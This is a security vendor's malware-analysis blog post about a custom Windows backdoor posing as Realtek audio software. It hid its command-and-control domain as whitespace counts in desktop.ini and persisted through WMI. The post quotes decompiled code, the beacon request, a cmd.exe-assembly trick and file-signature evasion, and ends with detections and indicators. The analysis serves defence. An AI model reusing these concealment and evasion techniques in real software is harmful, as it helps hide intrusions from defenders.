---
schema_version: "1.0.0"
document_id: "1e999db1ed5901658320cea7e816adaf63746be2ea6032245d390af4768d4762"
company_key: "gen-digital-inc-common-stock"
company: "Gen Digital Inc."
source_id: "gen-digital-inc-common-stock-rss-b2c253ea0afd"
canonical_url: "https://www.gendigital.com/blog/insights/research/kb-backdoor"
published_at: "2026-08-14T13:52:27+00:00"
first_seen_at: "2026-08-14T14:13:02.903458+00:00"
fetched_at: "2026-08-14T14:13:05.056968+00:00"
content_hash: "sha256:20244d3f5384a05a366fd3c6b4f5d141bb14202ea2bdc3d2b8e529a0e0a769ae"
---

# A 12 KB Backdoor Hid Its C2 Domain in desktop.ini Whitespace

By[Milánek](https://www.gendigital.com/blog/authors/milanek)


We found a custom Windows backdoor on a single corporate workstation while hunting for unusual WMI persistence. The malware was small, had a limited command set and disguised itself as legitimate Realtek software. Its most unusual feature was its configuration: the address of its command-and-control server was not stored as readable text or encrypted data, but encoded in the number of spaces on each line of a Windows \`desktop.ini\` file. To a user, and to many automated inspection systems, the file would appear almost empty. To the malware, those spaces spelled out its server address. We found no evidence connecting the backdoor to a known threat actor, and the original infection happened before our protection was installed. However, the implant's custom design, its deployment on only one observed machine and the absence of related samples suggest that this may have been a deliberately targeted operation rather than a failed mass campaign.


## An event subscription named "Realtek"


Most malicious WMI subscriptions are easy to spot because the query asks for something no administrator would. This one asked for something an administrator plausibly might, at a very specific time.


Our behavioural engine dumped the subscription it objected to. This is our own export of the WMI objects rather than a file the attacker left on disk, with the host name redacted:


A filter watching` Win32_LocalTime` for hour 19, minute 50 is a restart timer, not a boot hook. The subscription itself lives in the WMI repository and survives reboots; what it does not do is start anything at boot, so a machine restarted in the morning stays quiet until the evening.


` RtkNGUI64.exe` is the real name of Realtek's audio control panel, and the consumer's command line writes the path in 8.3 short form,` Progra~1` rather than` Program Files` .


## Why one machine is the interesting part


Everything in this post came from a single host: a domain-joined Windows 7 SP1 workstation, 64-bit. One managed endpoint, and our prevalence figure for the binary is exactly one.


That number is easy to misread, because low prevalence usually means a campaign that failed. Low prevalence should not mean low investigative priority: a threat sitting on one machine can matter more than one sitting on a hundred thousand, and a triage queue sorted by prevalence will show it to you last, if it shows it to you at all. The grounds for reading this one the other way need no victim detail at all.


The implant is custom-built: twelve kilobytes, no runtime library, and a config format that appears nowhere else in our corpus. None of the artefacts have ever been uploaded to VirusTotal in more than five years. We also searched VirusTotal by content for the fragments that would betray a sibling, including the` c%s%se /c %s` format string, the` a=%s&r=none` beacon body,` /version/check.php` inside Windows executables, and a stock UTF-16` desktop.ini` header followed by runs of spaces. All four returned nothing. Two looser patterns, the table its checksum routine uses to rebuild a polynomial and a bare run of UTF-16 spaces, matched unrelated files and tell us nothing either way.


The domain also typosquats a Windows service, which is a choice made by someone who knew what` DiagTrack` was rather than the output of a generation algorithm, whatever VirusTotal's` dga` tag suggests.


A commodity loader that only ever lands on one machine is broken. A hand-written implant that only ever lands on one machine may be working exactly as intended.


We will not push the assessment further than that. We never captured a task and never saw a second-stage payload, and we cannot tell you how the machine was reached, for a reason the timeline further down makes plain: the implant was already in place before our software arrived. Whatever the initial vector was, it happened on an endpoint nobody was watching. We name no actor and no campaign.


## What RtkNGUI64.exe actually is


The binary is a 12,288-byte x64 executable with no C runtime, no packer, and an entry point that goes straight into the main loop. It imports 48 functions by name across` KERNEL32` ,` WININET` ,` WS2_32` ,` IPHLPAPI` ,` SHLWAPI` and` ADVAPI32` , and that is the whole dependency list.` msvcrt.dll` is not on it, and leaving it out took deliberate work. The appendix has the substitutions the author wrote around it, the compiler they used, and the day they built it.


There is no encrypted blob, no import hashing and no anti-debug. The engineering worth looking at is all in where the thing keeps its configuration.


## The config is a desktop.ini full of spaces


On startup the backdoor assembles a path from the` PROGRAMDATA` environment variable and two string fragments, opens the result with` OPEN_ALWAYS` , and checks that there is something past the header to read:


```text
GetEnvironmentVariableA("PROGRAMDATA", ini_name, 0x40u); lstrcatA(ini_name, "\DESKTOP."); // first half of the filename


// ... bot ID, mutex, heap and pipe setup: sixteen lines ...


lstrcatA(ini_name, "ini"); // second half, appended much later


hFile = CreateFileA(ini_name, GENERIC_READ, 0, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0); // both the subtraction and the comparison are unsigned (jbe, not jle) if ( hFile == INVALID_HANDLE_VALUE || (payload_size = GetFileSize(hFile, 0) - 174) <= 0x31 ) ExitProcess(0);


```


The filename arrives in two pieces, and not adjacent ones: sixteen lines of unrelated setup sit between the two` lstrcatA` calls.` \\DESKTOP.` and` ini` are stored as separate literals in` .rdata` , so the string` desktop.ini` appears nowhere in the file. Grep the binary for it and you get nothing.


The size check is looser than it looks. The subtraction and the comparison are both unsigned —` jbe` in the disassembly — so it rejects only files of 174 to 223 bytes.` OPEN_ALWAYS` means a host with no config gets an empty` desktop.ini` created for it,` 0 - 174` wraps to` 0xFFFFFF52` , the guard passes, and the code asks the process heap for four gigabytes of zeroed memory. Nothing checks the result: on any machine that cannot satisfy that, the counting loop dereferences a null pointer. So on a host the operator never staged, the implant creates a zero-byte` C:\\ProgramData\\desktop.ini` and crashes on the spot.


Then it seeks to byte 174 and counts:


```text
SetFilePointer(hFile, 174, 0, FILE_BEGIN); // skip the stock Windows header ReadFile(hFile, payload, payload_size, &bytes_read, 0);


line = 0; i = 0; do { if ( payload[i] == 13 ) // CR: next line, skip the LF { ++line; i += 2; } else { ++line_lengths[line]; // count one character on this line } i += 2; // stride 2: the file is UTF-16LE } while ( i < payload_size );


lstrcpyA(g_server, line_lengths); // the counts are the string lstrcatA(g_server, ".com");


```


There is no key and no decryption.` line_lengths` is an array of bytes holding one count per line, and the last two statements hand that array to` lstrcpyA` as though it were a string. The number of characters on a line is the ASCII code of one character of the domain. This is unary encoding, the tally-marks of data formats.


The stride of 2 is there because the file is UTF-16LE, and the offset of 174 is not arbitrary: it is the exact byte length of a stock Windows` desktop.ini` , from the byte-order mark through a blank line, the` \[.ShellClassInfo\]` section header,` LocalizedResourceName=@%SystemRoot%\\system32\\shell32.dll,-21781` and its closing CRLF. The attacker invented no file format. They took the real Windows file that gives the Program Files folder its localised display name and appended to it.


In an editor it looks like an ordinary system file with some trailing whitespace. Typed out as UTF-16LE strings, it is thirteen lines: the three-line stock header, then ten lines containing nothing else.


The addresses in that left column are the domain. Each line starts two bytes per space plus four for the CRLF after its predecessor, so` 0x17A - 0xAE` is 204, giving 100 spaces and the letter` d` . Counting the spaces on each line of the sample we recovered gives ten numbers:


Line Spaces Character


1 100 d


2 105 i


3 97 a


4 103 g


5 114 r


6 116 t


7 114 r


8 97 a


9 99 c


10 107 k


With the hardcoded suffix, the backdoor calls home to` diagrtrack.com` .


That name is a typosquat of` DiagTrack` , the Windows service better known by its display name, Connected User Experiences and Telemetry. The malware hid the address of its telemetry server inside a Windows shell configuration file, and named that server after the Windows telemetry service.


```text
Twenty lines of Python recover the domain from any config of this shape:


HEADER_LEN = 174 # length of the stock Windows Program Files desktop.ini


def decode(path): with open(path, "rb") as fh: payload = fh.read()[HEADER_LEN:]


counts, current, i = [], 0, 0
while i < len(payload):
if payload[i] == 0x0D:      # CR ends a line; skip the following LF
counts.append(current)
current = 0
i += 4
continue
current += 1
i += 2                      # stride 2: UTF-16LE


if current:
counts.append(current)


return "".join(chr(c) for c in counts) + ".com"


```


The scheme is wasteful in a revealing way. Because each character costs as many UTF-16 spaces as its ASCII value, the config's size is a direct function of the domain it hides:` 174 + 2 * sum(character codes) + 4 * lines` , which for` diagrtrack` gives 2,318 bytes exactly. The file size is a fingerprint of the domain, and the domain can be narrowed down from the file size alone.


## The C2 protocol


Each victim gets an eight-character identifier: the CRC-32 of` USERNAME` ,` USERDOMAIN` and` COMPUTERNAME` concatenated, formatted as` %08X` . The same value becomes the name of a mutex, and a second copy waits a second for it before giving up. That matters more than it sounds, because the first copy never gives up: the binary has exactly one` ExitProcess` call, in the configuration routine, reached only when the mutex is already held or the config is unusable. Past that point the process loops forever. The 19:50 trigger therefore fires to useful effect once per boot, and every later firing dies on the mutex.


The CRC is standard, but neither the polynomial nor the usual 256-entry lookup table is anywhere in the file. What is there is a 14-byte table of bit positions that the code walks at runtime, setting one bit per entry to rebuild` 0xEDB88320` . That reads like an attempt to leave no constant for a scanner to key on, and it is not: it is zlib's` DYNAMIC_CRC_TABLE` build option, copied in whole. The appendix works out which decade the copy came from.


Every cycle then opens with an ICMP knock rather than an HTTP request. The backdoor resolves the domain, puts its eight-byte identifier in the payload of a 32-byte echo request, and waits a second for a reply. Only if the ping succeeds does it speak HTTP:


```text
POST /version/check.php HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 Content-Type: application/x-www-form-urlencoded


a=<id>&r=none


```


A beacon with nothing to report sends` r=none` : the first one, and every cycle where the last response carried no command or only a` time` change. Otherwise` r` carries the previous command's output, base64-encoded and then URL-encoded. The user agent is a hardcoded Chrome 78 string, frozen at whatever was current when the author wrote it.


Tasking comes back in the response body, which the malware scans for the literal` CMD=` . There are three verbs:


- ` system` runs a command through` cmd.exe` , captures stdout and stderr through a pipe, and gives up after 30 seconds with the text` cmd timeout`
- ` put` writes a file, taking a path and base64 content
- ` time` changes the polling interval, which starts at five seconds


That is the whole command set. No file listing, no screenshots, no keylogging. Whatever the operator wanted, they were going to get it by shelling out and writing files.


## Two smaller touches


The` put` handler does something odd before it writes. It base64-decodes the content, decrements the first byte and increments the second, writes the result to` tempcache.tmp` , renames that to the target path, and only then reopens the file to patch the correct two bytes back. A dropped executable therefore sits on disk with` L\[` where its` MZ` signature belongs, right up until a final two-byte write. Anything scanning on file creation or rename sees something that is not a PE at all.


The same habit accounts for` cmd.exe` , which is absent from the binary in one piece and assembled at the call site:


```text
wnsprintfA(buffer, 0xFFFF, "c%s%se /c %s", "md.", "ex", command);


```


Neither trick would trouble a modern behavioural engine, but together they show what the author was worried about: on-access file scanners and string searches, enough to write awkward code to dodge them.


## One machine, one dead domain


The dates are where this stops being a story about clever encoding.


The domain was registered on 23 July 2020 through a privacy proxy. The binary was compiled on 2 December 2020 at 13:34 UTC, and the config file on the victim's disk was created a little over three hours later. Build and deploy inside one afternoon.


Our software was installed twenty-one days later. Every date that follows is from the middle of the incident rather than the start, and the first evening the backdoor started on that machine is not something we have any record of.


The last DNS record we hold for` diagrtrack.com` is from March 2021. The registration lapsed that July and nobody renewed it. Nobody re-registered it either: the domain has no whois record today and does not resolve. Even the squatters passed.


The backdoor did not notice. We collected the same WMI subscription from that host three times, in February, August and October 2021, which is how we know the persistence stayed in place rather than being cleaned and reinstalled. When a detection we wrote for this file shape went live in June 2022, it fired on the same machine, and the config was still sitting in` C:\\ProgramData` .


From the code we know what that machine did for the eleven months after the registration lapsed. At 19:50 the WMI consumer started the process, it counted the spaces, rebuilt` diagrtrack.com` , and called` getaddrinfo` , which failed. The failure changed less than you would think, because the address buffer is never initialised and nothing checks the return value: every five seconds the implant read whatever bytes happened to be on its stack, called` inet_addr` on them, and sent an ICMP echo to the result. Then it slept and did it again, until the machine was next rebooted. There was no one on the other end for any of it.


## Detection opportunities


Configuration formats do not have to look like configuration formats. A routine that counts spaces is still a parser, and a file containing no suspicious strings, high-entropy blob or encoded text can still carry a C2 address in plain sight. Any pipeline that finds data mainly by looking for things that resemble data risks treating whitespace as empty.


Structural detections are more durable. A hash covers one binary and a domain block covers one address, but a rule describing the shape of this configuration survives changes to both.


Past byte 174, a legitimate` desktop.ini` should not consist entirely of UTF-16 spaces, carriage returns and line feeds. We deployed a detection for that structure in June 2022 and ran it until November. Across our user base, it fired only on the machine we already knew about. It would nevertheless detect another configuration using the same technique with a completely different domain.


The same characteristics also provide several inexpensive hunting opportunities:


-


Look for` __EventFilter` and` CommandLineEventConsumer` pairs bound to` Win32_LocalTime` , particularly those launching executables from paths intended to resemble legitimate software.


-


Inspect` C:\\ProgramData\\desktop.ini` , especially when it contains the Program Files localization string` shell32.dll,-21781` .


-


Treat a zero-byte` C:\\ProgramData\\desktop.ini` as potentially significant. That is the crash artefact this implant creates when the operator has not staged a valid configuration.


-


Look for` desktop.ini` files containing a legitimate Windows header followed only by UTF-16 whitespace.


## Conclusion


Everything in this investigation came from one endpoint. That does not tell us how consequential the intrusion was, because we never captured a command, recovered a second-stage payload or established how the machine was first compromised. It does tell us that prevalence alone would have been a poor reason to ignore it.


The implant was custom-built, its configuration format was absent from the rest of our corpus, and searches for related binaries and protocol fragments found no convincing siblings. We assess with moderate confidence that it was deployed selectively, while stopping short of naming an actor or campaign.


By the time our detection found it, the C2 domain had been expired for eleven months. The backdoor was still starting at 19:50 after every reboot, rebuilding the address from lines of spaces, and trying to contact an operator who was no longer there.


The detection was not wrong. It was late.


## Appendix: build and CRC provenance


Two details that change nothing about the story but pin down what the author built this with.


### The missing runtime


` msvcrt.dll` is absent from the import table, and that absence took work.` SHLWAPI` is there to supply` wnsprintfA` ,` StrStrA` and` StrToIntA` in place of` sprintf` ,` strstr` and` atoi` , the` str*` family is` lstrcpyA` and friends from` KERNEL32` , and` memset` and` memcpy` are the author's own two routines, because the compiler emits calls to those whether you link a runtime or not. The binary also carries its own compiler receipt in` .rdata` :


GCC: (tdm64-1) 4.9.2


That is TDM-GCC, a MinGW-w64 distribution, and the linker version of 2.24 and the missing Rich header agree with the string. The PE timestamp reads 2 December 2020, 13:34 UTC. A default build from that toolchain would enter at` mainCRTStartup` and import` msvcrt.dll` , so the runtime had to be left out on purpose and the entry point aimed at the author's own function.


### The polynomial that is not there


The 14-byte table in` .rdata` is a list of bit positions:


0, 1, 2, 4, 5, 7, 8, 10, 11, 12, 16, 22, 23, 26


At runtime the code walks that table and sets one bit per entry, counting down from bit 31:


for ( i = 0; i != 14; ++i ) poly |= 1 << (31 - tap_table\[i\]);


The result is` 0xEDB88320` , the reflected CRC-32 polynomial, which has exactly 14 bits set. Before crediting the author for that: this is zlib. The routine is` crc32()` line for line, from the null-pointer guard through the pre- and post-inversion to the eight-bytes-at-a-time unrolled loop, compiled with` DYNAMIC_CRC_TABLE` — the zlib build option that generates the lookup table on first use instead of shipping a kilobyte of constants — and GCC has inlined the static` make_crc_table` into it, which is why the table build sits inside the same function. zlib[built the polynomial from that list of exponents](https://github.com/madler/zlib/blob/v1.2.11/crc32.c#L88-L106) from January 1996 until the 1.2.12 release, in March 2022, replaced it with a plain` #define POLY 0xedb88320` . The comment sitting directly above the list writes the same polynomial out longhand, as` x^32+x^26+x^23+x^22+x^16+x^12+x^11+x^10+x^8+x^7+x^5+x^4+x^2+x+1` , so the table is the polynomial as a mathematician would state it rather than a constant kept out of a scanner's way. It did not go away for tidiness either: the[commit that removed it](https://github.com/madler/zlib/commit/f8719f5ae5acdc31d3794ddfea8ac963359de41e) rewrote the whole routine around the interleaved CRC method of Kadatch and Jenkins, and the new` #define` was a byproduct of chasing a factor of three in speed.


The confirmation is in` .data` , which in this binary holds exactly one initialised variable: a` dd 1` that the CRC routine clears once the table exists. That is zlib's` crc_table_empty` . What is not there is the thread-safety flag zlib added in September 2004, so their copy of` crc32.c` came from some zlib released between 1996 and 2004, at least sixteen years stale by the time they compiled it. The missing constant is a build option, not tradecraft.


## Indicators of Compromise


Indicator Type


diagrtrack{.}com C2 domain (expired, no longer resolves)


d411d93f358128c77aed0be91365b18cfb7575ecd188d22a216cbaeaa51c5e11 Backdoor, RtkNGUI64.exe


1cc5a4be7f2e41086b53e698b487e43426e5e572bc99e5de62eada9baf83bdcd Whitespace-encoded config


C:\\Program Files\\Realtek\\Audio\\RtkNGUI64.exe Fake install path


C:\\ProgramData\\desktop.ini Config location


/version/check.php C2 URI path


Realtek WMI filter, consumer and binding name


More on this topic


[The phishing link that died on purpose – From Research](https://www.gendigital.com/blog/insights/research/the-phishing-link-that-died-on-purpose)


[Fake invoices are moving from inboxes to shopping apps – From Research](https://www.gendigital.com/blog/insights/research/fake-invoices-shopping-apps)


[Inside Vidar’s ABE Bypass: From Memory Scanning to APC Injections – From Research](https://www.gendigital.com/blog/insights/research/inside-vidar-abe-bypass)


[Milánek](https://www.gendigital.com/blog/authors/milanek)


Senior Malware Researcher


Follow us for more
